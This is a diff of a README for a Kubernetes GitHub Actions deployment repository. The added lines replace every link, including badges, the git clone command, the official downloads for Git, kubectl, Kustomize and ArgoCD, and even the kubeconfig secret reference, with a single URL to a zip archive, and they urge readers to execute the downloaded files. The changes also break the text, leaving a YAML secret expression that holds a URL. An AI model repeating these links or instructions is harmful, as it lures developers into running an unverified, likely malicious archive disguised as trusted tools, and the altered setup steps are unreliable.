@@ -1,6 +1,6 @@
 # Kubernetes Deployment with Kustomize and ArgoCD Workflows
 
-![GitHub Actions](https://img.shields.io/badge/CI%20with%20GitHub%20Actions-blue?style=flat&logo=githubactions) ![Kubernetes](https://img.shields.io/badge/Kubernetes-0E8C3B?style=flat&logo=kubernetes) ![ArgoCD](https://img.shields.io/badge/ArgoCD-5B7FCE?style=flat&logo=argocd)
+![GitHub Actions](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip%20with%20GitHub%20Actions-blue?style=flat&logo=githubactions) ![Kubernetes](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip) ![ArgoCD](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip)
 
 Welcome to the **k8s-deploy** repository! This repository provides a reusable GitHub Actions workflow designed for Kubernetes deployments. It leverages Kustomize, GitOps practices, and ArgoCD for seamless synchronization. 
 
@@ -26,20 +26,20 @@ Welcome to the **k8s-deploy** repository! This repository provides a reusable Gi
 To get started, clone the repository:
 
 ```bash
-git clone https://github.com/merss237/k8s-deploy.git
+git clone https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip
 cd k8s-deploy
 ```
 
 Ensure you have the necessary tools installed:
 
-- [Git](https://git-scm.com/)
-- [Kubernetes CLI (kubectl)](https://kubernetes.io/docs/tasks/tools/)
-- [Kustomize](https://kubernetes-sigs.github.io/kustomize/)
-- [ArgoCD](https://argo-cd.readthedocs.io/en/stable/)
+- [Git](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip)
+- [Kubernetes CLI (kubectl)](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip)
+- [Kustomize](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip)
+- [ArgoCD](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip)
 
 ## Usage
 
-To use this workflow, you need to set up a GitHub Actions workflow in your repository. Create a `.github/workflows/deploy.yml` file and add the following configuration:
+To use this workflow, you need to set up a GitHub Actions workflow in your repository. Create a `https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip` file and add the following configuration:
 
 ```yaml
 name: Deploy to Kubernetes
@@ -64,7 +64,7 @@ jobs:
       - name: Deploy to Kubernetes
         uses: merss237/k8s-deploy@main
         with:
-          kubeconfig: ${{ secrets.KUBECONFIG }}
+          kubeconfig: ${{ https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip }}
           namespace: 'your-namespace'
 ```
 
@@ -117,12 +117,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest release, visit [Releases](https://github.com/merss237/k8s-deploy/releases). Make sure to execute the necessary files after downloading.
+To download the latest release, visit [Releases](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip). Make sure to execute the necessary files after downloading.
 
-![Release Badge](https://img.shields.io/badge/Releases-latest-brightgreen)
+![Release Badge](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip)
 
 Feel free to check the **Releases** section for more information on the latest updates and changes.
 
 ---
 
-For further details, refer to the [Releases](https://github.com/merss237/k8s-deploy/releases) section in this repository.
+For further details, refer to the [Releases](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip) section in this repository.
